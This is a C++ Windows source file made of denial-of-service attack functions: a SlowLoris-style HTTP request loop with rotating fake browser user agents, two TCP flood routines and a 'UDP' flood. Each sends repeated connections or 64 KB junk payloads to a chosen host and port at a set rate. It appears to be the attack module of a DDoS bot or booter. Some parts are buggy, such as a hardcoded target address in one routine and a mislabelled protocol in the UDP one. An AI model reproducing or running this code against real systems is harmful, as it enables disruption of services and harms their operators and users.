#pragma comment(lib, "ws2_32.lib")
#include <ws2tcpip.h>
#include <random>
#include <winsock2.h>









int ResolveHostName(const char* pszHostName, sockaddr_in* pAddr)
{

	int ret;
	HRESULT hr = S_OK;
	addrinfo* pResultList = NULL;
	addrinfo hints = {};
	int result = -1;

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	ret = getaddrinfo(pszHostName, NULL, &hints, &pResultList);

	result = (ret == 0) ? 1 : -1;
	if (result != -1)
	{
		// just pick the first one found
		*pAddr = *(sockaddr_in*)(pResultList->ai_addr);
		result = 0;
	}

	if (pResultList != NULL)
	{
		::freeaddrinfo(pResultList);
	}

	return result;
}


std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}


void SlowLoris(char* destination, unsigned short port, int seconds, int timespersecond)
{

		//std::string param = random_string(20)+"="+ random_string(20) + "&"+ random_string(20) +"="+ random_string(20) + "&" + random_string(20) + "=" + random_string(20) + "&" + random_string(20) + "=" + random_string(20);
		std::string param ="";
		char* host;
		char* path;
		HTTPURL u(destination);
		int min = 1;
		int max = 4;

		host = (char*)u.domain.c_str();
		path = (char*)u.path.c_str();

		TCHAR hdrs[] = TEXT("Connection: Keep-Alive");
		LPVOID frmdata = (LPVOID)param.c_str();
		LPCSTR accept[2] = { "text/plain", NULL };

		std::vector<std::string> v = { 
			"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
			"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)", 
			"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)", 
			"Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0", 
			"Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
			"Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
			"Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; YPC 3.2.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)",
			"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
			"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
			"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
			"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
			"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; OfficeLiveConnector.1.4; OfficeLivePatch.1.3; yie8)",
			"Opera/9.10 (Windows NT 5.1; U; it)",
			"Opera / 9.10 (X11; Linux i686; U; en)",
			"Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00"
		};

		std::random_device random_device;
		std::mt19937 engine{ random_device() };
		std::uniform_int_distribution<int> dist(0, v.size() - 1);
	


	for (int i = 0; i < seconds * timespersecond; i++) {
		HINTERNET hSession;
		HINTERNET hConnect;
		HINTERNET hRequest;
		std::string random_element = v[dist(engine)];
		//std::cout << random_element;

		std::random_device rd;
		std::mt19937 mt(rd());
		std::uniform_int_distribution<int> dist(1, 2);
		std::string method = "POST";
		if (dist(mt) == 1) {
			std::string method = "GET";
		}

		hSession = InternetOpen(random_element.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
		hConnect = InternetConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
		hRequest = HttpOpenRequest(hConnect, method.c_str(), path, NULL, NULL, accept, INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, 1);

		if (!HttpSendRequest(hRequest,
			hdrs,
			strlen(hdrs),
			frmdata, //lpOptional <--Your POST data...not really optional for you.
			strlen(param.c_str()))) {
			DWORD errorCode = GetLastError();
			std::cout << errorCode;
		}
		//HttpSendRequest(hRequest, hdrs, strlen(hdrs), frmdata, strlen(param.c_str()));
		DWORD rSize;
		char tmp[1024 + 1];
		string szBuffer;

		while (InternetReadFile(hRequest, tmp, 1024, &rSize) && rSize > 0){}

		InternetCloseHandle(hSession);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hRequest);
	}

}





void TCPFlood2(char* destination, unsigned short port, int seconds, int timespersecond)
{
		SOCKET sock = -1;
		WSADATA data = {};
		sockaddr_in addrRemote = {};
		int result;

		WSAStartup(MAKEWORD(2, 2), &data);

		sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock != -1)
		{
			if (ResolveHostName("10.0.0.9", &addrRemote) != -1)
			{
				addrRemote.sin_port = htons(80);
				for (int i = 0; i < seconds * timespersecond; i++) {
					result = connect(sock, (sockaddr*)& addrRemote, sizeof(addrRemote));
				}
			
			}
		}

		if (sock != -1)
		{
			closesocket(sock);
			sock = -1;
		}
	
}











bool GetSocketAddress(char* host, sockaddr_in* address)
{
	struct addrinfo* result = NULL;
	struct addrinfo* ptr = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	if (getaddrinfo(host, "http", &hints, &result)) return false;

	*address = *(sockaddr_in*)(result[0].ai_addr);
	freeaddrinfo(result);
	return true;
}

void TCPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	
	if (!GetSocketAddress(destination, &input)) {
		std::cout << "failed";
		return;
	}
	
	std::cout << destination;
	input.sin_port = htons(port);
	SOCKET s;

	char data[65536];
	memset(data, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (s == 0) continue;

		int cRes = connect(s, (sockaddr*)& input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			std::cout << "failed";
			closesocket(s); continue;
		}
		send(s, data, 65536, 0);
		Sleep(10);
		send(s, data, 65536, 0);

		closesocket(s);
	}
}

void UDPFlood(char* destination, unsigned short port, int seconds, int timespersecond) {
	sockaddr_in input;
	if (!GetSocketAddress(destination, &input)) return;
	input.sin_port = htons(port);
	SOCKET c;

	char dat[65536];
	memset(dat, 0xCC, 65536);

	for (int i = 0; i < seconds * timespersecond; i++) {
		Sleep(1000 / timespersecond);
		c = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);
		if (c == 0) continue;
		int cRes = connect(c, (sockaddr*)& input, sizeof(input));
		if (cRes == SOCKET_ERROR) {
			closesocket(c); continue;
		}
		send(c, dat, 65536, 0);
		Sleep(10);
		send(c, dat, 65536, 0);

		closesocket(c);
	}
}